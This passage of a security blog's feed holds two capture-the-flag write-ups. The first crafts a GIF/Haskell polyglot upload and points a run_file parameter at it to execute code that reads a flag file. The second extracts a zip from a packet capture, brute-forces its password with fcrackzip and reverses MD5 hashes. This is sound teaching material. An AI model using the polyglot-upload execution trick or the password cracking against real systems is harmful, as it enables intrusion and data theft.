<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># systemctl restart SuSEfirewall2.service</div><div class="line">or</div><div class="line"># rcSuSEfirewall2 restart</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Install rTorrent, git ang nginx:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/categories/linux/opensuse/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="http://rawsec.ml/tags/system/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/tags/opensuse/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF - 150 - try - Web</title>
    <link href="http://rawsec.ml/en/C3CTF-33-150-try-web/"/>
    <id>http://rawsec.ml/en/C3CTF-33-150-try-web/</id>
    <published>2016-12-27T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.842Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : 33C3 CTF</li>
<li><strong>Website</strong> : <a href="https://33c3ctf.ccc.ac/" target="_blank" rel="external">33c3ctf.ccc.ac</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/404" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>&quot;I never try anything, I just do it!&quot; <a href="http://78.46.224.73/" target="_blank" rel="external">Do</a></p>
<p>Flag is in /challenge/flag</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>Home page looks like this (need to log in with just a pseudo):</p>
<p><img src="http://i.imgur.com/i5jBUHP.png" alt=""></p>
<p>On the profil page we can upload a profil picture (only gif):</p>
<p><img src="http://i.imgur.com/tPtblHp.png" alt=""></p>
<p>You can't use easy trick to upload any files except gif:</p>
<ul>
<li>no double or triple extensions</li>
<li>no MIME type changing</li>
<li>not just the GIF file header <code>47 49 46 38 37 61</code> (GIF87a) +  GIF file trailer <code>00 3B</code> (;) -- see <a href="http://www.garykessler.net/library/file_sigs.html" target="_blank" rel="external">file signatures</a></li>
</ul>
<p><img src="http://i.imgur.com/gB74rLj.png" alt=""></p>
<p>You have to upload the <s>nearly</s> full <a href="http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever" target="_blank" rel="external">skeleton</a> of the GIF picture.</p>
<p>But you can use a web proxy (like burpsuite) and append whatever you want at the end of the GIF.</p>
<p>As the website seems to execute Haskell algorithms, I tried to append some haskell code.</p>
<p>hello world (just to confirm haskell execution):</p>
<p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">main</span> = putStrLn <span class="string">"hello world"</span></div></pre></td></tr></table></figure></p>
<p>But just now we want to know where is uploaded our profil picture. It's embedded in the heading and have a location like this <code>http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code>.</p>
<p><strong>Note</strong>: path is unpredictable and file is renamed.</p>
<p>What to do now? Try to execute it.</p>
<p>On the home page when you want to run some of the examples, you can see with a web proxy that the file to execute is up to you:</p>
<p><img src="http://i.imgur.com/OMaIqIH.png" alt=""></p>
<p>A legitimate run file is <code>run_file=fib.hs</code>.</p>
<p>If you try the download link you can see that this haskell script is hosted at <code>http://78.46.224.73/static/fib.hs</code>. Just remember that our picture is located at <code>http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code>. So what happen if we change it to <code>run_file=33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code> and if we append some haskell code at the end of the picture?</p>
<p>Unfortunatly this lead to an error: <code>lexical error at character '\SOH'</code> (with the tiniest GIF)</p>
<p><img src="http://i.imgur.com/iuLfarc.png" alt=""></p>
<p>or <code>lexical error (UTF-8 decoding error)</code> (with a real GIF)</p>
<p><img src="http://i.imgur.com/7JrAwbI.png" alt=""></p>
<p>So we conclude that the interpreter try to execute the bytecode of the GIF image. Unfortunatly we are not able to upload only haskell.</p>
<p>To limit error possibilities we tried to upload one of the tiniest GIF and replaced 0x01 (SOF) with 0x00 (null) but the website doesn't allow that.</p>
<p>I think we have to upload a GIF file and neutralize GIF data. Then I read an excellent <a href="https://quadhead.de/storing-javascript-code-in-gif-images/" target="_blank" rel="external">article</a> talking about how to store javascript code in a GIF, so I tried to do the same with a haskell comment.</p>
<p>In haskell comments (<a href="https://wiki.haskell.org/Reference_card" target="_blank" rel="external">ref</a>) are like this:</p>
<ul>
<li><code>-- a single line comment</code></li>
<li><code>{- A multiline comment which can continue for many lines -}</code></li>
</ul>
<table>
<thead>
<tr>
<th>ASCII</th>
<th>Hex</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>{</code></td>
<td>0x7b</td>
</tr>
<tr>
<td><code>}</code></td>
<td>0x7d</td>
</tr>
<tr>
<td><code>-</code></td>
<td>0x2d</td>
</tr>
</tbody>
</table>
<p>A legitimate minimalistic GIF would be:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ xxd handtinyblack.gif</div><div class="line">00000000: 4749 4638 3961 0100 0100 00ff 002c 0000  GIF89a.......,..</div><div class="line">00000010: 0000 0100 0100 0002 003b                 .........;</div></pre></td></tr></table></figure></p>
<p>Our malicious GIF with haskell comment and appended code would be:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ xxd vuln.gif</div><div class="line">00000000: 4749 4638 3961 7b2d 0100 0100 00ff 002c  GIF89a&#123;-.......,</div><div class="line">00000010: 0000 0000 0100 0100 0002 003b 2d7d 0a6d  ...........;-&#125;.m</div><div class="line">00000020: 6169 6e20 3d20 7075 7453 7472 4c6e 2022  ain = putStrLn &quot;</div><div class="line">00000030: 6865 6c6c 6f20 776f 726c 6422 0a         hello world&quot;.</div></pre></td></tr></table></figure></p>
<p>But again we have an error: <code>Parse error: naked expression at top level. Perhaps you intended to use TemplateHaskell</code></p>
<p><img src="http://i.imgur.com/1uVcIAd.png" alt=""></p>
<p>So we want to change <em>GIF89a</em> from an expression to a variable or a function, but the problem is that in haskell functions can't begin with an uppercase letter, only data <a href="https://wiki.haskell.org/Constructor" target="_blank" rel="external">constructor</a> can. So we can't begin with something like <code>GIF89a :: Integer</code> and if we begin with somethin else than <code>GIF89a</code> the image is not recognized as valid.</p>
<p>All the difficulty is about crafting a valid haskell code beginning with <code>GIF89a</code>.</p>
<p>I went to the official Haskell IRC and asked for this question, the trick is to start the file with a pattern matching and declare it later (<a href="https://wiki.haskell.org/Parsing_expressions_and_statements#Make_token_parser" target="_blank" rel="external">ref</a>).</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ xxd vuln2.gif</div><div class="line">00000000: 4749 4638 3961 203d 2047 4946 3839 617b  GIF89a = GIF89a&#123;</div><div class="line">00000010: 2d01 0001 0000 ff00 2c00 0000 0001 0001  -.......,.......</div><div class="line">00000020: 0000 0200 3b2d 7d0a 6461 7461 2047 4946  ....;-&#125;.data GIF</div><div class="line">00000030: 3839 6120 3d20 4749 4638 3961 0a6d 6169  89a = GIF89a.mai</div><div class="line">00000040: 6e20 3d20 7075 7453 7472 4c6e 2022 6865  n = putStrLn &quot;he</div><div class="line">00000050: 6c6c 6f20 776f 726c 6422 0a              llo world&quot;.</div></pre></td></tr></table></figure></p>
<p>That works now! So now we will just switch the hello world program to somethinf reading the flag folder (we need native function because we can't use <em>import</em> as it needs to be at the beginning of the file in the heading section):</p>
<p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="title">main</span> = <span class="keyword">do</span>  </div><div class="line">    contents &lt;- readFile <span class="string">"/challenge/flag"</span></div><div class="line">    print $ contents</div></pre></td></tr></table></figure></p>
<p><img src="http://i.imgur.com/BwVowgX.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh Giay - Forensics</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-100-Banh-Giay/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-100-Banh-Giay/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>Submit: WhiteHat{SHA1(flag)}</p>
<p><a href="http://material.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip" target="_blank" rel="external">http://material.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip</a></p>
<p><a href="http://bakmaterial.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip" target="_blank" rel="external">http://bakmaterial.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip</a></p>
<p>Alternative server on amazon in case of low traffic:</p>
<p><a href="http://54.183.97.137/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip" target="_blank" rel="external">http://54.183.97.137/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip</a></p>
</blockquote>
<h2 id="solution">Solution</h2>
<ul>
<li>Download the zip.</li>
<li>Extract it.</li>
<li>Open the pcapng with <a href="https://www.wireshark.org/" target="_blank" rel="external">Wireshark</a>.</li>
<li>Filter <code>http</code> requests.</li>
<li>See frame n°134 <code>GET /corporation/secret HTTP/1.1</code>.</li>
<li>Extract the file (File &gt; Export Objects &gt; HTTP).</li>
<li>Check the type of file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ file secret</div><div class="line">secret: Zip archive data, at least v2.0 to extract</div></pre></td></tr></table></figure></p>
<ul>
<li>Unzip it:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ unzip secret</div><div class="line">Archive:  secret</div><div class="line">[secret] EasyExtrack password:</div></pre></td></tr></table></figure></p>
<ul>
<li>Ok, there is a pasword, let's check the html page: frame n°149 <code>GET /corporation/arsenal.html HTTP/1.1</code>.</li>
<li>Extract it from the pcapng.</li>
<li>See the hint: <code>For H.i.n.t: Referring to arsenal, i remember a number. It also length of secret p.a.s.s.w.o.r.d</code>.</li>
<li>One key event is:</li>
</ul>
<blockquote>
<p>30 October: Arsenal recorded victory in the League Cup to a record-breaking 7–5 scoreline at the Madjeski Stadium, having been 4–0 down initially. The game had the most goals ever scored in a single League Cup match (12).</p>
</blockquote>
<ul>
<li>With luck and guessing I found this number was <strong>4</strong>.</li>
<li>So now let's try to crack the zip password with <a href="http://manpages.ubuntu.com/manpages/precise/man1/fcrackzip.1.html" target="_blank" rel="external"><code>fcrackzip</code></a>:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ fcrackzip -b -c a -l 4 -u secret</div><div class="line"></div><div class="line">PASSWORD FOUND!!!!: pw == fuzu</div></pre></td></tr></table></figure></p>
<ul>
<li>Extract the zip with the password.</li>
<li>Check what file type <code>EasyExtrack</code> is:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ file EasyExtrack</div><div class="line">EasyExtrack: Zip archive data, at least v1.0 to extract</div></pre></td></tr></table></figure></p>
<ul>
<li>Try to unzip it with the same password:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ unzip EasyExtrack -d out</div><div class="line">Archive:  EasyExtrack</div><div class="line">   creating: out/EasyExtrack/</div><div class="line">[EasyExtrack] EasyExtrack/flag1.txt password:</div><div class="line">  inflating: out/EasyExtrack/flag1.txt  </div><div class="line">  inflating: out/EasyExtrack/flag10.txt  </div><div class="line">  inflating: out/EasyExtrack/flag11.txt  </div><div class="line">  inflating: out/EasyExtrack/flag12.txt  </div><div class="line">  inflating: out/EasyExtrack/flag13.txt  </div><div class="line">  inflating: out/EasyExtrack/flag14.txt  </div><div class="line">  inflating: out/EasyExtrack/flag15.txt  </div><div class="line">  inflating: out/EasyExtrack/flag16.txt  </div><div class="line">  inflating: out/EasyExtrack/flag17.txt  </div><div class="line">  inflating: out/EasyExtrack/flag18.txt  </div><div class="line">  inflating: out/EasyExtrack/flag19.txt  </div><div class="line">  inflating: out/EasyExtrack/flag2.txt  </div><div class="line">  inflating: out/EasyExtrack/flag20.txt  </div><div class="line">  inflating: out/EasyExtrack/flag21.txt  </div><div class="line">  inflating: out/EasyExtrack/flag22.txt  </div><div class="line">  inflating: out/EasyExtrack/flag23.txt  </div><div class="line">  inflating: out/EasyExtrack/flag24.txt  </div><div class="line">  inflating: out/EasyExtrack/flag25.txt  </div><div class="line">  inflating: out/EasyExtrack/flag26.txt  </div><div class="line">  inflating: out/EasyExtrack/flag27.txt  </div><div class="line">  inflating: out/EasyExtrack/flag28.txt  </div><div class="line">  inflating: out/EasyExtrack/flag29.txt  </div><div class="line">  inflating: out/EasyExtrack/flag3.txt  </div><div class="line">  inflating: out/EasyExtrack/flag30.txt  </div><div class="line">  inflating: out/EasyExtrack/flag4.txt  </div><div class="line">  inflating: out/EasyExtrack/flag5.txt  </div><div class="line">  inflating: out/EasyExtrack/flag6.txt  </div><div class="line">  inflating: out/EasyExtrack/flag7.txt  </div><div class="line">  inflating: out/EasyExtrack/flag8.txt  </div><div class="line">  inflating: out/EasyExtrack/flag9.txt</div></pre></td></tr></table></figure></p>
<ul>
<li>Here are all the flags:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;12f54a96f6444324693t0da001cafda8b&#125;</div><div class="line">raw: Flag&#123;60b725f10c9c85c70d9h7880dfe8191b3&#125;</div><div class="line">raw: Flag&#123;f5302386464f953ed58u1edac03556e55&#125;</div><div class="line">raw: Flag&#123;d9bed3b7e151f11b8fdyadf75f1db96d9&#125;</div><div class="line">raw: Flag&#123;3b5d5c3712955042212n316173ccf37be&#125;</div><div class="line">raw: Flag&#123;72cfd272ace172fa3502h6445fbef9b03&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;9a8ad92c50cae39aa2c5604pfd0ab6d8c&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;12f54a96f64443s246930da001cafda8b&#125;</div><div class="line">raw: Flag&#123;92520a5a9cf8932i20b9cd447f585f144&#125;</div><div class="line">raw: Flag&#123;01fbdc44ef819db6p273bc30965a23814&#125;</div><div class="line">raw: Flag&#123;9ffbf43126e33be52hcd2bf7e01d627f9&#125;</div><div class="line">raw: Flag&#123;12f54a96f644432469o30da001cafda8b&#125;</div><div class="line">raw: Flag&#123;9d7bf075372908f55e2nd945c39e0a613&#125;</div><div class="line">raw: Flag&#123;92520a5a9cf893220b9cud447f585f144&#125;</div><div class="line">raw: Flag&#123;009520053b00386d1173fu3988c55d192&#125;</div><div class="line">raw: Flag&#123;e73af36376314c7c0022cbk1d204f76b3&#125;</div><div class="line">raw: Flag&#123;e85dde330c34efb0e526ee3j082e4353b&#125;</div><div class="line">raw: Flag&#123;7d9d25f71cb8a5aba8620254l0a20d405&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Flags are not hashes because they are 33 char long. But we can see there is one non-hex char in each flag.</li>
<li>Remove each non-hex flag to get 32 char long MD5 hashed:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">12f54a96f64443246930da001cafda8b</div><div class="line">60b725f10c9c85c70d97880dfe8191b3</div><div class="line">f5302386464f953ed581edac03556e55</div><div class="line">d9bed3b7e151f11b8fdadf75f1db96d9</div><div class="line">3b5d5c3712955042212316173ccf37be</div><div class="line">72cfd272ace172fa35026445fbef9b03</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">9a8ad92c50cae39aa2c5604fd0ab6d8c</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">12f54a96f64443246930da001cafda8b</div><div class="line">92520a5a9cf893220b9cd447f585f144</div><div class="line">01fbdc44ef819db6273bc30965a23814</div><div class="line">9ffbf43126e33be52cd2bf7e01d627f9</div><div class="line">12f54a96f64443246930da001cafda8b</div><div class="line">9d7bf075372908f55e2d945c39e0a613</div><div class="line">92520a5a9cf893220b9cd447f585f144</div><div class="line">009520053b00386d1173f3988c55d192</div><div class="line">e73af36376314c7c0022cb1d204f76b3</div><div class="line">e85dde330c34efb0e526ee3082e4353b</div><div class="line">7d9d25f71cb8a5aba86202540a20d405</div></pre></td></tr></table></figure></p>
<ul>
<li>The extracted wrong letters are (in order): <code>xthuynhxxxpxxxxxxxxsiphonuukjl</code>.</li>
<li>Use <a href="https://hashkiller.co.uk/md5-decrypter.aspx" target="_blank" rel="external">hashkiller.co.uk</a> to decrypt MD5 hashes:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">12f54a96f64443246930da001cafda8b MD5 : l</div><div class="line">60b725f10c9c85c70d97880dfe8191b3 MD5 : a</div><div class="line">f5302386464f953ed581edac03556e55 MD5 : g</div><div class="line">d9bed3b7e151f11b8fdadf75f1db96d9 MD5 : &#123;</div><div class="line">3b5d5c3712955042212316173ccf37be MD5 : b</div><div class="line">72cfd272ace172fa35026445fbef9b03 MD5 : r</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">9a8ad92c50cae39aa2c5604fd0ab6d8c MD5 : f</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">12f54a96f64443246930da001cafda8b MD5 : l</div><div class="line">92520a5a9cf893220b9cd447f585f144 MD5 : _</div><div class="line">01fbdc44ef819db6273bc30965a23814 MD5 : h</div><div class="line">9ffbf43126e33be52cd2bf7e01d627f9 MD5 : e</div><div class="line">12f54a96f64443246930da001cafda8b MD5 : l</div><div class="line">9d7bf075372908f55e2d945c39e0a613 MD5 : p</div><div class="line">92520a5a9cf893220b9cd447f585f144 MD5 : _</div><div class="line">009520053b00386d1173f3988c55d192 MD5 : y</div><div class="line">e73af36376314c7c0022cb1d204f76b3 MD5 : o</div><div class="line">e85dde330c34efb0e526ee3082e4353b MD5 : u</div><div class="line">7d9d25f71cb8a5aba86202540a20d405 MD5 : &#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Unformated flag is: <code>Flag{brFFFfFFFFFFFFl_help_you}</code>.</li>
<li>SHA1 the unformated flag:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]</div><div class="line">$ printf %s &apos;Flag&#123;brFFFfFFFFFFFFl_help_you&#125;&apos; | sha1sum</div><div class="line">e7643ccd180c84176ae0b4361c3b169fceacf961  -</div></pre></td></tr></table></figure></p>
<ul>
<li>Format the flag: <code>WhiteHat{e7643ccd180c84176ae0b4361c3b169fceacf961}</code>.</li>
<li>Not the good flag ...</li>
</ul>
<p>Note that <code>800618943025315f869e4e1f09471012</code> is the right md5 hash for <code>F</code> and <code>d2a33790e5bf28b33cdbf61722a06989</code> is the wrong md5 hash for <code>F</code> that you can obtain with non POSIX tools like echo (that's why I use printf). So only hashkiller knows both wrong and right hash, all other md5 decrypt online tools knows only the right one so they are not able to decrypt <code>d2a33790e5bf28b33cdbf61722a06989</code>. But anyway...</p>
<ul>
<li>You know what? After some wasted hours I figured that I needed to replace <code>F</code> with some guessed letters:  <code>Flag{bruteforce_will_help_you}</code>. Yes guessing again.</li>
<li>SHA1 the unformated flag:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]</div><div class="line">$ printf %s &apos;Flag&#123;bruteforce_will_help_you&#125;&apos; | sha1sum</div><div class="line">1e71b26aa01733cd13e5199386c70fe31df43deb  -</div></pre></td></tr></table></figure></p>
<ul>
<li>Format the flag: <code>WhiteHat{1e71b26aa01733cd13e5199386c70fe31df43deb}</code>.</li>
<li>Not the good flag ...</li>
<li>Description said <code>Submit: WhiteHat{SHA1(flag)}</code>, it depends if <code>flag</code> means <code>Flag{xxx}</code> or <code>xxx</code>.</li>
<li>SHA1 the unformated flag:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]</div><div class="line">$ printf %s &apos;bruteforce_will_help_you&apos; | sha1sum                                                                    </div><div class="line">31bd8aa56447ea1c703d0943e175a06a5c4ee614  -</div></pre></td></tr></table></figure></p>
<ul>
<li>Format the flag: <code>WhiteHat{31bd8aa56447ea1c703d0943e175a06a5c4ee614}</code>.</li>
<li>This time this is the good one.</li>
</ul>
<p>Here was my ruby script:</p>
